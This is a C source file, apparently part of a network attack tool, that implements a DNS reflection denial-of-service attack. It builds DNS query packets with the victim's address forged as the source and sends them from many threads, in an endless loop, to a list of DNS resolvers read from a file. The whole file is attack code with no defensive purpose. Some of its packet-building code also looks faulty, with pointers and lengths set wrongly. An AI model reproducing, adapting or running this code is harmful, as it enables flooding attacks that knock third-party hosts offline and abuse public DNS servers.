#include <stdio.h>      // printf
#include <string.h>     // strlen
#include <stdlib.h>     // malloc
#include <sys/socket.h> // you know what this is for
#include <arpa/inet.h>  // inet_addr , inet_ntoa , ntohs etc
#include <netinet/in.h>
#include <netinet/udp.h>
#include <netinet/ip.h> // struct ip

#include <unistd.h> // getpid
#include <errno.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/wait.h>
#include <sys/time.h>
#include <sys/types.h>
#include <signal.h>

#include "../main.h"
#include "attack_dns_reflect_dos.h"

extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
extern int DisplayInfo(const char *fmt, ...);
extern int DisplayWarning(const char *fmtsring, ...);
extern int DisplayError(const char *fmt, ...);

extern void FreeProcessDNSIPListBuff(pStrHeader p);
extern pStrHeader ProcessDNSIPListFile(pStrHeader *output);
extern unsigned short CalculateSum(unsigned short *ptr, int nbytes);
extern int LocateStrNodeElement(const pStrHeader p, pStrNode *element, const size_t loc);

extern void FreeSplitURLBuff(pSplitURLOutput p);
extern int SplitURL(const char *url, pSplitURLOutput *output);
extern void SignalExit(int signo);

extern pIPList_Thread SplitIPForThread(pIPList_Thread *output, const pInput input, const pStrHeader str_header);
extern void FreeIPListBuff(pIPList_Thread input);

//List of DNS Servers registered on the system
//char dns_servers[10][100];
//int dns_server_count = 0;

//#pragma pack(push, 1)
//#pragma pack(pop)

static void FreeDNSStructBuff(pDNSStruct input)
{
    // free the structure
    if (input)
    {
        if (input->dst_ip)
        {
            free(input->dst_ip);
        }
        free(input);
    }
}

static void ChangetoDNSNameFormat(char *dns, char *host)
{
    // This will convert www.google.com to 3www6google3com
    // got it :)

    int lock = 0, i;
    strcat((char *)host, ".");

    for (i = 0; i < strlen((char *)host); i++)
    {
        if (host[i] == '.')
        {
            *dns++ = i - lock;
            for (; lock < i; lock++)
            {
                *dns++ = host[lock];
            }
            lock++; //or lock=i+1;
        }
    }

    *dns++ = '\0';
}

static int SendDNS(const pDNSStruct ds, const int debug_level)
{
    // Perform a DNS query by sending a packet
    char *host = (char *)malloc(MAX_URL_LENGTH);
    memcpy(host, DNS_QUERY_NAME_DEFAULT, MAX_URL_LENGTH);
    int query_type = DNS_QUERY_TYPE_DEFAULT;
    char *datagram, *qname;
    int socket_fd;

    pDNSHeader dnsh = NULL;
    pQuestion qinfo = NULL;

    DisplayDebug(2, debug_level, "Resolving %s", host);

    socket_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP); // UDP packet for DNS queries
    if (socket_fd < 0)
    {
        DisplayError("Create socket failed: %s(%d)", strerror(errno), errno);
        if (errno == 1)
        {
            DisplayWarning("This program should run as root user");
        }
        else if (errno == 24)
        {
            DisplayWarning("You shoud check max file number use 'ulimit -n' in linux");
            DisplayWarning("And change the max file number use 'ulimit -n <setting number>'");
            DisplayWarning("Or you can change the EACH_IP_REPEAT_TIME value to delay the attack end time");
        }
        return 1;
    }

    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(ds->dst_port);          // dns port
    sin.sin_addr.s_addr = inet_addr(ds->dst_ip); // dns servers

    int pksize = sizeof(struct ip) + sizeof(struct udphdr) + sizeof(DNSHeader);
    datagram = (char *)malloc(pksize);

    // set the DNS structure to standard queries
    dnsh = (pDNSHeader)&datagram;
    dnsh->id = (unsigned short)htons(getpid());
    dnsh->qr = 0;     // this is a query
    dnsh->opcode = 0; // this is a standard query
    dnsh->aa = 0;     // not authoritative
    dnsh->tc = 0;     // this message is not truncated
    dnsh->rd = 1;     // recursion desired
    dnsh->ra = 0;     // recursion not available! hey we dont have it (lol)
    dnsh->z = 0;
    dnsh->ad = 0;
    dnsh->cd = 0;
    dnsh->rcode = 0;
    dnsh->q_count = htons(1); // we have only 1 question
    dnsh->ans_count = 0;
    dnsh->auth_count = 0;
    dnsh->add_count = 0;

    struct ip *iph;
    iph = (struct ip *)datagram;
    // entete ip
    iph->ip_v = 4;
    iph->ip_hl = 5;
    iph->ip_tos = 0;
    iph->ip_len = sizeof(pksize);
    iph->ip_ttl = 255;
    iph->ip_off = 0;
    iph->ip_id = sizeof(45);
    iph->ip_p = IPPROTO_UDP;
    iph->ip_sum = 0; // a remplir aprés
    iph->ip_src.s_addr = inet_addr(ds->src_ip);
    iph->ip_dst.s_addr = inet_addr(ds->dst_ip);

    struct udphdr *udph;
    udph = (struct udphdr *)(datagram + sizeof(struct ip));
    udph->uh_sport = htons(ds->src_port);
    udph->uh_dport = htons(ds->dst_port);
    udph->uh_ulen = htons(sizeof(struct udphdr) + sizeof(DNSHeader));
    udph->uh_sum = CalculateSum((unsigned short *)udph, sizeof(struct udphdr) + sizeof(DNSHeader));

    // point to the query portion
    qname = (char *)&datagram[sizeof(DNSHeader)];

    ChangetoDNSNameFormat(qname, host);
    qinfo = (pQuestion)&datagram[sizeof(DNSHeader) + (strlen((const char *)qname) + 1)]; //fill it

    qinfo->qtype = htons(query_type); // type of the query , A , MX , CNAME , NS etc
    qinfo->qclass = htons(1);         // its internet (lol)

    DisplayDebug(2, debug_level, "Sending Packet...");
    if (sendto(socket_fd, (char *)datagram, sizeof(DNSHeader) + (strlen((const char *)qname) + 1) + sizeof(Question), 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
        DisplayError("Send failed: %s(%d)", strerror(errno), errno);
    }

    free(datagram);
    return 0;
}

static int AttackThread(pDNSStruct dns_struct)
{
    // now we start the syn flood attack

    int i;
    pStrNode str_node = dns_struct->str_header->next;
    pSplitURLOutput split_result;

    DisplayDebug(DEBUG_LEVEL_3, dns_struct->debug_level, "AttackThread start sending data...");

    while (str_node)
    {

        // in here, we deal with the ip list
        if (!SplitURL(str_node->str, &split_result))
        {
            DisplayError("AttackThread SplitURL failed");
            return 1;
        }

        // node cicle

        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->protocol);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->host);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %d", split_result->port);
        DisplayDebug(DEBUG_LEVEL_2, dns_struct->debug_level, "split_reult: %s", split_result->suffix);

        if (split_result->port == 0)
        {
            if (strlen(split_result->host) == 0)
            {
                DisplayError("AttackThread SplitURL not right");
                return 1;
            }
            // make the port as default
            split_result->port = ACK_REFLECT_PORT_DEFAULT;
        }
        // init the target ip and port
        dns_struct->dst_ip = (char *)malloc(IP_BUFFER_SIZE);
        if (!(dns_struct->dst_ip))
        {
            DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!memset(dns_struct->dst_ip, 0, IP_BUFFER_SIZE))
        {
            DisplayError("AttackThread memset failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        if (!strncpy(dns_struct->dst_ip, split_result->host, strlen(split_result->host)))
        {
            DisplayError("AttackThread strncpy failed: %s(%d)", strerror(errno), errno);
            return 1;
        }
        dns_struct->dst_port = split_result->port;
        FreeSplitURLBuff(split_result);

        // for test
        //DisplayWarning("src address: %s - src port: %d - dst address: %s - dst port: %d", syn_struct->src_ip, syn_struct->src_port, syn_struct->dst_ip, syn_struct->dst_port);

        for (i = 0; i < dns_struct->each_ip_repeat; i++)
        {
            if (SendDNS(dns_struct, dns_struct->debug_level))
            {
                DisplayError("AttackThread Attack failed");
                return 1;
            }
        }

        str_node = str_node->next;
    }
    return 0;
}

int StartDNSReflectAttack(const pInput input)
{
    // this file's core function

    pthread_t tid[input->max_thread];
    pthread_attr_t attr;
    int j, ret;

    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
    signal(SIGINT, SignalExit);

    pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
    pStrHeader str_header;
    pSplitURLOutput split_result;

    dns_struct->debug_level = input->debug_level;
    dns_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessDNSIPListFile(&str_header))
    {
        DisplayError("ProcessDNSIPListFile failed");
        return 1;
    }

    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("AttackThread SplitURL failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("AttackThread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(dns_struct->src_ip))
    {
        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
    {
        DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    dns_struct->src_port = (int)split_result->port;

    FreeSplitURLBuff(split_result);

    pIPList_Thread list, tmp_list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        DisplayError("SplitIPForThread failed");
        return 1;
    }
    // str_header no longer used
    free(str_header);

    // unlimit loop
    for (;;)
    {
        // only one process
        tmp_list = list;
        // start again
        for (j = 0; j < input->max_thread; j++)
        {
            // every thread has onlyone target address
            // thread end try next address
            dns_struct->str_header = tmp_list->list;
            tmp_list = tmp_list->next;
            //DisplayWarning("syn_struct src_ip: %s", syn_struct->src_ip);

            //input->serial_num = (i * input->max_thread) + j;
            if (pthread_attr_init(&attr))
            {
                DisplayError("StartSYNFlood pthread_attr_init failed");
                return 1;
            }
            //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
            if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
            {
                DisplayError("StartSYNFlood pthread_attr_setdetachstate failed");
                return 1;
            }
            // create thread
            ret = pthread_create(&tid[j], &attr, (void *)AttackThread, dns_struct);
            //printf("j is: %d\n", j);
            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
            // here we make a map
            if (ret != 0)
            {
                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
                DisplayError("Create pthread failed");
                return 1;
            }
            pthread_attr_destroy(&attr);
            // for the test
            // also for the each thread ready
            sleep(1);
        }
        //pthread_detach(tid);
        // join them all
        for (j = 0; j < input->max_thread; j++)
        {
            pthread_join(tid[j], NULL);
        }
        // exit for test
        //return 0;
    }
    FreeDNSStructBuff(dns_struct);
    FreeIPListBuff(list);

    //unsigned char hostname[100];
    //Now get the ip of this hostname , A record
    //ngethostbyname(hostname, T_A);
    return 0;
}

int StartDNSReflectTest(const pInput input)
{
    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
    signal(SIGINT, SignalExit);

    pDNSStruct dns_struct = (pDNSStruct)malloc(sizeof(DNSStruct));
    pStrHeader str_header;
    pSplitURLOutput split_result;

    dns_struct->debug_level = input->debug_level;
    dns_struct->each_ip_repeat = input->each_ip_repeat;

    if (!ProcessDNSIPListFile(&str_header))
    {
        DisplayError("ProcessDNSIPListFile failed");
        return 1;
    }

    if (!SplitURL(input->address, &split_result))
    {
        DisplayError("AttackThread SplitURL failed");
        return 1;
    }
    if (split_result->port == 0)
    {
        if (strlen(split_result->host) == 0)
        {
            DisplayError("AttackThread SplitURL not right");
            return 1;
        }
        // make the port as default
        split_result->port = ACK_REFLECT_PORT_DEFAULT;
    }

    dns_struct->src_ip = (char *)malloc(IP_BUFFER_SIZE);
    if (!(dns_struct->src_ip))
    {
        DisplayError("AttackThread malloc failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    if (!memset(dns_struct->src_ip, 0, IP_BUFFER_SIZE))
    {
        DisplayError("AttackThread memset failed: %d(%s)", strerror(errno), errno);
        return 1;
    }
    if (!strncpy(dns_struct->src_ip, input->address, strlen(input->address)))
    {
        DisplayError("AttackThread copy SRC_ADDRESS failed: %s(%d)", strerror(errno), errno);
        return 1;
    }
    dns_struct->src_port = (int)split_result->port;

    FreeSplitURLBuff(split_result);

    pIPList_Thread list;
    if (!SplitIPForThread(&list, input, str_header))
    {
        DisplayError("SplitIPForThread failed");
        return 1;
    }
    // str_header no longer used
    free(str_header);
    dns_struct->str_header = list->list;

    // unlimit loop
    AttackThread(dns_struct);

    FreeDNSStructBuff(dns_struct);
    FreeIPListBuff(list);
    return 0;
}